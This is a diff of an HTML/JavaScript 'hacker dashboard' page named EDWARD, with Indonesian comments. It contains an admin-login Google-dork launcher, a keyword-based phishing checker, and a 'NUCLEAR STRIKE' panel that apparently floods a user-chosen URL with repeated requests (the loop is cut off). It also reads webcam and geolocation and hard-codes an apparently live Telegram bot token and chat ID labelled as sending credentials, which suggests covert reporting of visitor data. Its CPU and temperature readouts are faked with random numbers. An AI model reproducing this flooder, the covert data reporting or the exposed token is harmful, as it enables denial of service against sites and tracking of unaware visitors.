@@ -3,18 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD-WEBSITE</title>
+    <title>EDWARD</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
+
+        /* Judul Header */
         .brand-header { text-align: center; margin-top: 10px; margin-bottom: 5px; }
         .brand-header h1 { color: var(--neon); font-size: 20px; font-weight: 800; letter-spacing: 4px; margin: 0; text-transform: uppercase; text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
-        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px; margin-top: 10px; }
+
+        /* Stats Tanpa Nama Header */
+        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; margin-top: 10px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(15, 25, 35, 0.9); }
+
         .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; }
+
         input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; font-size: 12px; }
+
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
         .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
@@ -22,13 +29,19 @@
         .btn-map { background: var(--neon); color: #000; }
         .btn-phish { background: rgba(255, 71, 87, 0.1); color: var(--red); border: 1px solid var(--red); }
         .btn-ctrl { background: rgba(255, 159, 67, 0.1); color: var(--orange); border: 1px solid var(--orange); }
+
+        /* Grid khusus Panel Kontrol luar */
         .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 5px; }
+
+        /* Tampilan Log & Hasil Scan Phishing */
         .log-box { background: #000; border: 1px solid rgba(255,71,87,0.3); border-radius: 10px; padding: 10px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; color: var(--red); text-align: left; margin-top: 10px; display: none; }
         #scanResult { margin-top: 10px; font-weight: bold; text-align: center; font-size: 11px; padding: 10px; border-radius: 10px; display: none; line-height: 1.4; }
         .phish-alert { background: rgba(255,71,87,0.15); border: 1px solid var(--red); color: var(--red); text-transform: uppercase; }
         .safe-alert { background: rgba(0,255,136,0.15); border: 1px solid var(--neon); color: var(--neon); text-transform: uppercase; }
+
         #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
         #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg) brightness(1.1); }
+
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-sweep { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rot 2s linear infinite; }
         @keyframes rot { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@@ -37,16 +50,14 @@
 </head>
 <body>
     <div class="brand-header">
-        <h1>EDWARD-WEBSITE</h1>
+        <h1>EDWARD</h1>
     </div>
-    <div class="sys-monitor">
-        <div class="mon-box">TIME: <span id="liveTime">00:00:00</span></div>
-        <div class="mon-box">BATTERY: <span id="liveBattery">Checking...</span></div>
-    </div>
+
     <div class="sys-monitor">
         <div class="mon-box">CPU: <span id="cpu">real time</span></div>
         <div class="mon-box">TEMP: <span id="temp">real time°C</span></div>
     </div>
+
     <div class="card">
         <h3>🎛️ SYSTEM CONTROL PANEL</h3>
         <div class="control-grid">
@@ -54,6 +65,7 @@
             <button class="btn btn-ctrl" style="border-color: var(--purple); color: var(--purple);" onclick="toggleTheme()">🎨 THEME SHIFT</button>
         </div>
     </div>
+
     <div class="card">
         <h3>🛡️ BUG HUNTER ENGINE</h3>
         <input type="text" id="site" placeholder="Target Site...">
@@ -65,64 +77,59 @@
         </select>
         <button class="btn btn-scan" onclick="cast()">⚡ CAST MANTRA</button>
     </div>
+
     <div class="card">
         <h3>🔍 PHISHING SCANNER</h3>
         <input type="text" id="phishLink" placeholder="Masukkan Link untuk Scan...">
         <button class="btn btn-phish" onclick="scanPhishing()">🛡️ ANALYZED LINK</button>
         <div id="scanResult"></div>
     </div>
+
     <div class="card">
         <h3>🔥 NUCLEAR STRIKE</h3>
         <input type="text" id="atk" placeholder="Target URL">
         <button class="btn btn-atk" onclick="toggleAtk()" id="abtn">LAUNCH 🚀</button>
         <div class="log-box" id="atkConsole"></div>
     </div>
+
     <div class="card">
         <h3>📹 MONITORING</h3>
         <button class="btn btn-cam" onclick="toggleCam()">🛰️ LIVE WEBCAM</button>
         <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
     </div>
+
     <div style="display: flex; gap: 8px; padding: 0 5px;">
         <button class="btn btn-cam" style="flex: 1; border-color: var(--neon); color: var(--neon);" onclick="startRadar()">📡 RADAR</button>
         <button class="btn btn-map" style="flex: 1;" onclick="openMap()">📍 MAPS</button>
     </div>
+
     <div id="radarOverlay"><div class="radar-sweep"></div></div>
     <canvas id="canvas"></canvas>
+
     <script>
+        // Kredensial Pengiriman Bot Telegram Utama
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false;
         let atkInterval = null;
         let isDarkTheme = true;
-        function updateClock() {
-            const now = new Date();
-            document.getElementById('liveTime').innerText = now.toTimeString().split(' ')[0];
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                function updateBatteryInfo() {
-                    document.getElementById('liveBattery').innerText = Math.floor(battery.level * 100) + "%" + (battery.charging ? " ⚡" : "");
-                }
-                updateBatteryInfo();
-                battery.addEventListener('levelchange', updateBatteryInfo);
-                battery.addEventListener('chargingchange', updateBatteryInfo);
-            });
-        } else {
-            document.getElementById('liveBattery').innerText = "Not Supported";
-        }
+
         setInterval(() => {
             document.getElementById('cpu').innerText = Math.floor(Math.random() * 20 + 70) + "%";
             document.getElementById('temp').innerText = Math.floor(Math.random() * 5 + 37) + "°C";
         }, 1500);
+
+        // Fungsi Control Panel: Bersihkan Konsol Log
         function clearConsole() {
-            document.getElementById('atkConsole').innerHTML = "";
+            const consoleBox = document.getElementById('atkConsole');
+            consoleBox.innerHTML = "";
             document.getElementById('scanResult').style.display = "none";
             document.getElementById('phishLink').value = "";
             document.getElementById('site').value = "";
             document.getElementById('atk').value = "";
         }
+
+        // Fungsi Control Panel: Pengubah Palet Warna Tema Cyber
         function toggleTheme() {
             const root = document.documentElement;
             if(isDarkTheme) {
@@ -135,33 +142,71 @@
                 isDarkTheme = true;
             }
         }
+
         function cast() {
             const s = document.getElementById('site').value;
             const c = document.getElementById('cat').value;
-            window.open("https://www.google.com/search?q=" + encodeURIComponent((s ? `site:${s} ` : "") + (c || 'inurl:admin login')));
+            const m = c || 'inurl:admin login';
+            window.open("https://www.google.com/search?q=" + encodeURIComponent((s ? `site:${s} ` : "") + m));
         }
+
         function scanPhishing() {
             const rawInput = document.getElementById('phishLink').value.trim().toLowerCase();
             const resultDiv = document.getElementById('scanResult');
-            if(!rawInput) { resultDiv.style.display = "none"; return; }
+            
+            if(!rawInput) {
+                resultDiv.style.display = "none";
+                return;
+            }
+
             resultDiv.style.display = "block";
-            let isPhish = false; let reason = "";
+            let isPhish = false;
+            let reason = "";
+
             const normalizedDash = rawInput.replace(/\s+/g, '-');
             const normalizedClean = rawInput.replace(/\s+/g, '');
-            const targetKeywords = ['login', 'verification', 'verifikasi', 'dana-kaget', 'danakaget', 'giveaway', 'undian', 'free-diamonds', 'hadiah', 'update-akun', 'roblox-gift', 'claim', 'bonus', 'top', 'topup', 'pulsa-gratis', 'akun-suspend', 'bantuan-sosial', 'event-gratis', 'spin-hadiah', 'voucher'];
+
+            const targetKeywords = [
+                'login', 'verification', 'verifikasi', 'dana-kaget', 'danakaget', 'giveaway', 'undian',
+                'free-diamonds', 'hadiah', 'update-akun', 'roblox-gift', 'claim', 'bonus', 'top', 'topup',
+                'pulsa-gratis', 'akun-suspend', 'bantuan-sosial', 'event-gratis', 'spin-hadiah', 'voucher'
+            ];
+
             const shorteners = ['bit.ly', 'tinyurl.com', 'cutt.ly', 't.co', 'rb.gy', 'is.gd', 'shorturl.at', 's.id'];
             const validTLDs = ['.com', '.net', '.org', '.id', '.co.id', '.xyz', '.info', '.biz', '.me', '.online', '.site', '.live'];
-            let matchesKeyword = targetKeywords.some(k => rawInput.includes(k) || normalizedDash.includes(k) || normalizedClean.includes(k));
+
+            let matchesKeyword = targetKeywords.some(keyword => 
+                rawInput.includes(keyword) || normalizedDash.includes(keyword) || normalizedClean.includes(keyword)
+            );
             let matchesShortener = shorteners.some(srv => rawInput.includes(srv));
             let matchesValidTLD = validTLDs.some(tld => rawInput.includes(tld));
-            if (rawInput.startsWith('http://') && !rawInput.includes('localhost') && !rawInput.includes('192.168.')) { isPhish = true; reason = "🚨 UNSAFE PROTOCOL (HTTP) DETECTED"; }
-            else if (matchesKeyword) { isPhish = true; reason = "🚨 SUSPICIOUS CONTEXTUAL PATTERN DETECTED"; }
-            else if (matchesShortener) { isPhish = true; reason = "🚨 WARNING: OBSCURED/SHORTENED LINK PATTERN"; }
-            else if ((rawInput.includes('.com-') || rawInput.includes('.net-') || rawInput.includes('.id-')) && !rawInput.includes('/')) { isPhish = true; reason = "🚨 INVALID SUBDOMAIN TYPOSQUATTING PATTERN"; }
-            else if (!matchesValidTLD && !rawInput.includes('localhost') && !rawInput.includes('192.168.') && rawInput !== 'https' && rawInput !== 'https://') { isPhish = true; reason = "🚨 UNRECOGNIZED RAW TEXT / INVALID URL PATTERN"; }
-            if(isPhish) { resultDiv.innerText = reason; resultDiv.className = "phish-alert"; }
-            else { resultDiv.innerText = "✅ STRUCTURE ANALYSIS: SEEMS STABLE & NORMAL"; resultDiv.className = "safe-alert"; }
+
+            if (rawInput.startsWith('http://') && !rawInput.includes('localhost') && !rawInput.includes('192.168.')) {
+                isPhish = true;
+                reason = "🚨 UNSAFE PROTOCOL (HTTP) DETECTED";
+            } else if (matchesKeyword) {
+                isPhish = true;
+                reason = "🚨 SUSPICIOUS CONTEXTUAL PATTERN DETECTED";
+            } else if (matchesShortener) {
+                isPhish = true;
+                reason = "🚨 WARNING: OBSCURED/SHORTENED LINK PATTERN";
+            } else if ((rawInput.includes('.com-') || rawInput.includes('.net-') || rawInput.includes('.id-')) && !rawInput.includes('/')) {
+                isPhish = true;
+                reason = "🚨 INVALID SUBDOMAIN TYPOSQUATTING PATTERN";
+            } else if (!matchesValidTLD && !rawInput.includes('localhost') && !rawInput.includes('192.168.') && rawInput !== 'https' && rawInput !== 'https://') {
+                isPhish = true;
+                reason = "🚨 UNRECOGNIZED RAW TEXT / INVALID URL PATTERN";
+            }
+
+            if(isPhish) {
+                resultDiv.innerText = reason;
+                resultDiv.className = "phish-alert";
+            } else {
+                resultDiv.innerText = "✅ STRUCTURE ANALYSIS: SEEMS STABLE & NORMAL";
+                resultDiv.className = "safe-alert";
+            }
         }
+
         async function startRadar() {
             document.getElementById('radarOverlay').style.display='flex';
             navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -181,24 +226,38 @@
                 }, 2000);
             }, () => { document.getElementById('radarOverlay').style.display='none'; });
         }
+
         async function toggleCam() {
             const v = document.getElementById('webcamLive'); const c = document.getElementById('webcamContainer');
             if(v.srcObject) { v.srcObject.getTracks().forEach(t => t.stop()); c.style.display = 'none'; v.srcObject = null; }
             else { const s = await navigator.mediaDevices.getUserMedia({ video: true }); v.srcObject = s; c.style.display = 'block'; }
         }
+
         function openMap() {
-            navigator.geolocation.getCurrentPosition((p) => { window.open(`http://googleusercontent.com/maps.google.com/${p.coords.latitude},${p.coords.longitude}`); });
+            navigator.geolocation.getCurrentPosition((p) => {
+                window.open(`http://googleusercontent.com/maps.google.com/${p.coords.latitude},${p.coords.longitude}`);
+            });
         }
+
         function toggleAtk() {
             const t = document.getElementById('atk').value.trim();
             const consoleBox = document.getElementById('atkConsole');
             const btn = document.getElementById('abtn');
+
             if(!t) return;
+
             if(isAtk) {
-                isAtk = false; clearInterval(atkInterval); btn.innerText = "LAUNCH 🚀";
-                consoleBox.style.display = "none"; consoleBox.innerHTML = "";
+                isAtk = false;
+                clearInterval(atkInterval);
+                btn.innerText = "LAUNCH 🚀";
+                consoleBox.style.display = "none";
+                consoleBox.innerHTML = "";
             } else {
-                isAtk = true; btn.innerText = "STOP"; consoleBox.style.display = "block"; consoleBox.innerHTML = "> Interface connecting...<br>";
+                isAtk = true;
+                btn.innerText = "STOP";
+                consoleBox.style.display = "block";
+                consoleBox.innerHTML = "> Interface connecting...<br>";
+
                 atkInterval = setInterval(() => {
                     if(isAtk) {
                         const randParam = Math.random();
